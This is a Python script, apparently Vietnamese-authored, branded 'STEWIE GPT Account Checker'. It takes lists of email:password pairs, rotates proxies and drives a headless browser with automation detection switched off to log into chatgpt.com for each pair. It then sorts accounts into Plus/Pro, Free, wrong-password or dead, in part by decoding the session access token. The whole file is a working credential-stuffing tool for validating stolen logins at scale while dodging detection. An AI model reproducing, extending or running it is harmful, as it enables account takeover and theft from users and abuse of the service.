import asyncio
import re
import json
import os
import sys
import time
import base64
import nodriver as uc
from rich.console import Console
from rich.panel import Panel
from rich.text import Text
from rich.rule import Rule
import pyfiglet

console = Console()

# Status codes
PLUS       = "PLUS"
FREE       = "FREE"
WRONG_PASS = "WRONG_PASS"
DIE        = "DIE"

def print_banner():
    art = pyfiglet.figlet_format("STEWIE", font="slant")
    console.print(f"[bold green]{art}[/bold green]", end="")
    console.print(Panel(
        "[bold white]GPT Account Checker[/bold white]  •  [dim]ChatGPT Plus / Pro / Free[/dim]",
        border_style="green",
        padding=(0, 4),
    ))
    console.print()
    with console.status("[green]Khởi động...[/green]", spinner="dots"):
        time.sleep(1.5)
    console.print()

async def wait_for(tab, selector, timeout=10):
    for _ in range(timeout * 5):
        el = await tab.query_selector(selector)
        if el:
            return el
        await asyncio.sleep(0.2)
    return None

async def get_page_error(tab):
    for sel in [
        "[data-testid='error-message-input']",
        "[class*='error']",
        ".error-message",
        "p[class*='ulp-input-error']",
    ]:
        el = await tab.query_selector(sel)
        if el:
            txt = await el.get_js_value("innerText")
            if txt and txt.strip():
                return txt.strip()
    return None

async def login(tab, email, password):
    try:
        btn = await tab.find("Log in", best_match=True, timeout=5)
        await btn.click()
        await asyncio.sleep(2)
    except Exception:
        pass

    email_input = await wait_for(tab, "input[name='username'], input[type='email']", timeout=15)
    if not email_input:
        return DIE, "Không thấy form login"

    await email_input.clear_input()
    await email_input.send_keys(email)

    btn = await tab.find("Continue", best_match=True, timeout=5)
    await btn.click()
    await asyncio.sleep(3)

    err = await get_page_error(tab)
    if err:
        t = err.lower()
        if any(k in t for k in ["doesn't exist", "no account", "not found", "wrong email"]):
            return DIE, err
        return DIE, err

    pass_input = await wait_for(tab, "input[type='password']", timeout=10)
    if not pass_input:
        return DIE, "Không thấy field password"

    await pass_input.send_keys(password)

    btn = await tab.find("Continue", best_match=True, timeout=5)
    await btn.click()
    await asyncio.sleep(5)

    err = await get_page_error(tab)
    if err:
        t = err.lower()
        if any(k in t for k in ["wrong password", "incorrect", "invalid"]):
            return WRONG_PASS, err
        return DIE, err

    for _ in range(20):
        if "chatgpt.com" in tab.url and "auth" not in tab.url:
            return PLUS, None
        await asyncio.sleep(1)

    return DIE, "Không redirect được về ChatGPT"

async def get_plan(tab):
    try:
        resp = await tab.evaluate("""
            fetch('/api/auth/session')
              .then(r => r.json())
              .then(d => JSON.stringify(d))
        """)
        if resp:
            data = json.loads(resp)
            token = data.get("accessToken", "")
            if token:
                parts = token.split(".")
                if len(parts) == 3:
                    padded = parts[1] + "=" * (-len(parts[1]) % 4)
                    payload = json.loads(base64.urlsafe_b64decode(padded))
                    for key in ["https://api.openai.com/profile", "orgs", "plan"]:
                        if key in payload:
                            return str(payload[key])
    except Exception:
        pass

    await asyncio.sleep(3)
    body = await tab.evaluate("document.body.innerText")
    if not body:
        return "Unknown"

    b = body.lower()
    if "chatgpt pro" in b or "pro plan" in b:
        return "Pro"
    if "chatgpt plus" in b or "plus plan" in b or "gpt-4o" in b:
        return "Plus"
    if "upgrade" in b and "plus" not in b:
        return "Free"

    for sel in [
        "button[aria-label*='account' i]",
        "button[aria-label*='profile' i]",
        "[data-testid='profile-button']",
        "img[alt*='User' i]",
        "nav button:last-child",
    ]:
        el = await tab.query_selector(sel)
        if el:
            await el.click()
            await asyncio.sleep(2)
            body = await tab.evaluate("document.body.innerText")
            b = body.lower()
            if "pro" in b:   return "Pro"
            if "plus" in b:  return "Plus"
            if "free" in b:  return "Free"
            break

    return "Unknown"

def _proxy_server_arg(proxy):
    """Build --proxy-server value with credentials embedded if present."""
    server = proxy["server"]
    username = proxy.get("username")
    password = proxy.get("password")
    if username and password:
        # Chromium accepts http://user:pass@host:port
        scheme, rest = server.split("://", 1) if "://" in server else ("http", server)
        return f"--proxy-server={scheme}://{username}:{password}@{rest}"
    return f"--proxy-server={server}"

async def check_account(email, password, proxy=None):
    browser_args = ["--disable-blink-features=AutomationControlled"]
    if proxy:
        browser_args.append(_proxy_server_arg(proxy))

    browser = await uc.start(headless=True, browser_args=browser_args)

    try:
        tab = await browser.get("https://chatgpt.com/")
        await asyncio.sleep(3)

        status, err_msg = await login(tab, email, password)

        plan = None
        if status in (PLUS, FREE):
            plan = await get_plan(tab)
            status = PLUS if plan in ("Plus", "Pro", "Team", "Enterprise") else FREE

        return {"email": email, "status": status, "plan": plan, "detail": err_msg}

    except Exception as e:
        return {"email": email, "status": DIE, "plan": None, "detail": str(e)}
    finally:
        browser.stop()

def load_proxies(filepath):
    proxies = []
    with open(filepath, encoding="utf-8") as f:
        for line in f:
            line = line.strip()
            if not line or line.startswith("#"):
                continue
            if line.startswith(("http://", "https://", "socks5://")):
                proxies.append({"server": line})
                continue
            parts = line.split(":")
            if len(parts) == 2:
                proxies.append({"server": f"socks5://{parts[0]}:{parts[1]}"})
            elif len(parts) == 4:
                # Có auth → HTTP (Chromium không support SOCKS5 auth)
                proxies.append({
                    "server":   f"http://{parts[0]}:{parts[1]}",
                    "username": parts[2],
                    "password": parts[3],
                })
    return proxies

def load_accounts(filepath):
    ext = os.path.splitext(filepath)[1].lower()
    accounts = []
    with open(filepath, encoding="utf-8") as f:
        if ext == ".json":
            data = json.load(f)
            if isinstance(data, list):
                for item in data:
                    accounts.append((item["email"], item["password"]))
            elif isinstance(data, dict):
                for email, pw in data.items():
                    accounts.append((email, pw))
        else:
            for line in f:
                line = line.strip()
                if not line or line.startswith("#"):
                    continue
                sep = "|" if "|" in line else ":"
                parts = line.split(sep, 1)
                if len(parts) == 2:
                    accounts.append((parts[0].strip(), parts[1].strip()))
    return accounts

def print_result(r, idx, total):
    status = r["status"]

    if status == PLUS:
        status_text = Text("✅ PLUS / PRO", style="bold green")
    elif status == FREE:
        status_text = Text("🆓 FREE", style="bold blue")
    elif status == WRONG_PASS:
        status_text = Text("🔑 WRONG PASSWORD", style="bold yellow")
    else:
        status_text = Text("❌ DIE", style="bold red")

    content = Text()
    content.append("  📧 Tài khoản   : ", style="dim")
    content.append(f"{r['email']}\n", style="bold white")
    content.append("  📊 Status      : ", style="dim")
    content.append_text(status_text)
    if r["plan"]:
        content.append("\n  💎 Plan        : ", style="dim")
        content.append(r["plan"], style="bold cyan")
    if r["detail"]:
        content.append("\n  💬 Chi tiết    : ", style="dim")
        content.append(r["detail"], style="italic yellow")

    border = {
        PLUS: "green", FREE: "blue", WRONG_PASS: "yellow", DIE: "red"
    }.get(status, "red")

    console.print(Panel(content, title=f"[dim][{idx}/{total}][/dim]", border_style=border))

async def main():
    print_banner()

    if len(sys.argv) > 1:
        filepath = sys.argv[1]
    else:
        for default in ["accounts.txt", "accounts.json"]:
            if os.path.exists(default):
                filepath = default
                break
        else:
            console.print("[red]Dùng: python check_gpt.py <accounts.txt hoặc accounts.json>[/red]")
            return

    accounts = load_accounts(filepath)
    if not accounts:
        console.print("[red]Không đọc được account nào từ file.[/red]")
        return

    proxies = []
    for proxy_file in ["proxies.txt", "proxy.txt"]:
        if os.path.exists(proxy_file):
            proxies = load_proxies(proxy_file)
            console.print(f"[dim]Proxy  : [cyan]{len(proxies)}[/cyan] proxy từ {proxy_file}[/dim]")
            break

    console.print(f"[dim]Account: [cyan]{len(accounts)}[/cyan] account từ {filepath}[/dim]")
    console.print()

    results = []
    for i, (email, password) in enumerate(accounts, 1):
        proxy = proxies[(i - 1) % len(proxies)] if proxies else None
        proxy_tag = f" [dim]| {proxy['server']}[/dim]" if proxy else ""
        with console.status(
            f"[bold green]  Checking [{i}/{len(accounts)}] {email}{proxy_tag}...[/bold green]",
            spinner="dots",
        ):
            r = await check_account(email, password, proxy)

        print_result(r, i, len(accounts))
        results.append(r)

    plus  = sum(1 for r in results if r["status"] == PLUS)
    free  = sum(1 for r in results if r["status"] == FREE)
    wrong = sum(1 for r in results if r["status"] == WRONG_PASS)
    dead  = sum(1 for r in results if r["status"] == DIE)

    console.print(Rule(style="dim"))
    console.print(f"  [white]Tổng         :[/white] [bold]{len(results)}[/bold]")
    console.print(f"  [green]✅ PLUS/PRO  :[/green] [bold green]{plus}[/bold green]")
    console.print(f"  [blue]🆓 FREE      :[/blue] [bold blue]{free}[/bold blue]")
    console.print(f"  [yellow]🔑 WRONG     :[/yellow] [bold yellow]{wrong}[/bold yellow]")
    console.print(f"  [red]❌ DIE       :[/red] [bold red]{dead}[/bold red]")
    console.print(Rule(style="dim"))

if __name__ == "__main__":
    asyncio.run(main())
